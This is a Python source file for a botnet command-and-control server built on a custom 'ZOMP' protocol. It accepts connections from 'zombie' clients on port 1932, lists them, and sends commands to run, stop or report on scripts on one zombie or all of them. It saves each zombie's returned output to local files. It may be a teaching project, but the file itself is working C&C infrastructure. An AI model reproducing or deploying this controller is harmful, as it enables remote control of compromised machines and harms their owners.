#!/usr/bin/env python3

from socket import *
import select
import sys
import multiprocessing

NEED_SCRIPTNAME = "Need scriptname and arguments (if any)!"
RETURN_MAIN = "Returning to main loop."

ACCEPT_MSG = "ZOMP/1.0 0 ACCEPT\r\n\r\n"
CLOSE_MSG = "ZOMP/1.0 9 CLOSE\r\n\r\n"

NOT_UNDERSTOOD = "ZOMP/1.0 5 NOT UNDERSTOOD\r\n\r\n"

ZOMP_PORT = 1932

class ZOMPResponseBuffer(object):
    def __init__(self):
        self.buf = ""
        self.signal = '\r\n\r\n' # end of header signal
        self.code = ""
        self.status_message = ""
        self.script_invocation = ""
        self.num_chars = 0

    def bufferMessages(self,sock):
        while True:
            if self.num_chars <= 0:
                data = sock.recv(1024)

                if len(data) == 0:
                    return None
                
                self.buf += data.decode()

                signal_index = self.buf.find(self.signal)
                if signal_index != -1: # found end of header
                    header = self.buf[:signal_index]
                    print(header + "\n") # newline for readability
                    self.buf = self.buf[signal_index+len(self.signal):]
                    
                    try:
                        status_line, *rest_of_header = header.split('\r\n') # splitting along newlines and pulling first line out
                        version, code, msg = status_line.strip().split(' ', 2)
                    except ValueError:
                        print("Unpacking failed!")
                        sock.send(NOT_UNDERSTOOD.encode())
                        return None

                    self.code = code
                    self.status_message = msg
                    match code:
                        case "00": # this is the welcome case
                            sock.send(ACCEPT_MSG.encode())
                            return None
                            # zombie gets registered in main code loop
                        case "01" | "02": # error found; can modify later to handle any 0-09 code
                            print(f"Error: {code} {msg}")
                            return None
                        case _: # default case
                            script_line, content_length = rest_of_header
                            self.script_invocation = script_line
                            # parsing content-length
                            num_chars = int(content_length.split(': ')[1])
                            self.num_chars = num_chars
                            if code != "12" and code != "30": # means there is a report to return
                                return None # no entity body to return
                
            if self.num_chars > 0: # read entity body
                while len(self.buf) < self.num_chars:
                    data = sock.recv(1024)

                    if len(data) == 0:
                        return None
                    
                    self.buf += data.decode()
                return self.buf
            

class Zombie(object):
    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.process = multiprocessing.Process(target=handleResponses, args=(sock, addr))

    def __str__(self):
        result = f"{self.addr}"
        return result

def printHowTo() -> None:
    print("Usage: [RUN | STOP | REPORT] <scriptname> <args...>")
    print("EXIT to end")
    print("HELP to see this message again.")

def makeZOMPRequest(command: str, script_invocation: str, version: str = "1.0", ) -> str:
    match command.casefold():
        case "run":
            code = "1"
        case "stop":
            code = "2"
        case "report":
            code = "3"
    
    request = (
        f"ZOMP/{version} {code} {command.upper()}\r\n"
        f"{script_invocation}\r\n"
        f"\r\n" # end of header signal (and incidentally end of message)
    )
    # print(request)
    return request

def prettyPrintZombies(zombies: list[Zombie]) -> None:
    print("0: ALL zombies")
    for i,zombie in enumerate(zombies):
        print(f"{i+1}: {zombie}")
    print() # adding a newline for spacing

def selectTarget(zombies: list[Zombie]) -> int:
    if len(zombies) == 0:
        print("No zombies available.")
        return -1
    
    print("Which zombie?")
    prettyPrintZombies(zombies)
    choice = ""
    while choice.casefold() != "back":
        choice = sys.stdin.readline().strip()
        if (not choice.isdigit() or int(choice) > len(zombies)) and choice != "back":
            print("Invalid input. Try again! BACK to return to main menu.")
        else:
            return int(choice)
    return -1

def handleResponses(conn_sock: socket, zombie_id: str) -> None:
    buffer = ZOMPResponseBuffer()
    while True:
        msg = buffer.bufferMessages(conn_sock)
        if msg: 
            # let's write to a result file
            report_file = open(f"{zombie_id} {buffer.script_invocation}.txt", 'w')
            report_file.write(msg)
            report_file.close()
            buffer.num_chars = 0 # reset num_chars for next message
            buffer.buf = "" # reset buffer for next message

def main():
    sockets = [sys.stdin] # preloading our list with a listener for stdin
    welcome_sock = socket(AF_INET, SOCK_STREAM)
    welcome_sock.bind(('', ZOMP_PORT))
    welcome_sock.listen(10)
    sockets.append(welcome_sock)

    zombies: [Zombie] = []

    printHowTo()
    while True:
        ready_sockets, *_ = select.select(sockets, [], [])
        for sock in ready_sockets:
            if sock == sys.stdin:
                choice = sys.stdin.readline()
                command, *script_invocation = choice.strip().split(' ', 1)
                match command.casefold():
                    case "exit":
                        print("Shutting down C&C server...")
                        welcome_sock.close()
                        for zombie in zombies:
                            zombie.sock.send(CLOSE_MSG.encode())
                            zombie.sock.close()
                            zombie.process.terminate()
                        exit(1)
                    case "help":
                        printHowTo()
                    case "run" | "stop" | "report":
                        if not script_invocation:
                            print(NEED_SCRIPTNAME)
                        else:
                            script_invocation = " ".join(script_invocation) # combining into single string
                            target = selectTarget(zombies)
                            match target:
                                case -1:
                                    print(RETURN_MAIN)
                                case 0:
                                    for zombie in zombies:
                                        zombie.sock.send(makeZOMPRequest(command, script_invocation).encode())
                                case _: # default case; i.e. specific zombie
                                    target_zombie = zombies[target-1] # need to adjust by one (0 is all zombies)
                                    target_zombie.sock.send(makeZOMPRequest(command, script_invocation).encode())
                        
                    case _: # default case
                        print("Unknown command. HELP for more info.")
            elif sock == welcome_sock:
                conn_sock, addr = sock.accept()
                new_zombie = Zombie(conn_sock, addr)
                zombies.append(new_zombie)
                sockets.append(conn_sock) 
                new_zombie.process.start() # initialize pipeline to that zombie

if __name__ == '__main__':
    main()